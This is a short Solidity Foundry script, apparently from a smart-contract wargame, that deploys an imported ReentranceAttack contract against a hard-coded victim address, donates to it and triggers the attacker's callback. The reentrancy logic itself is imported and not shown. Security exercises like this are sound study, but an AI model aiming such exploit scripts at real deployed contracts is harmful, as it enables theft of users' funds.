// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/src/Script.sol";
import "forge-std/src/Test.sol";

import {ReentranceAttack} from "../ReentranceAttack.sol";
import {IReentrance} from "../IReentrance.sol";

contract ReentranceAttackScript is Script, Test {
  ReentranceAttack private reentranceAttack;

  IReentrance private victimContract = IReentrance(payable(0xb301285a6f0bd5B7CDDBD03Ef7756646eF35fFc9));

  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(deployerPrivateKey);

    reentranceAttack = new ReentranceAttack(victimContract);

    victimContract.donate{value: 1}(address(reentranceAttack));

    // trigger to callback function in attacker contract
    payable(reentranceAttack).transfer(1);

    vm.stopBroadcast();
  }
}
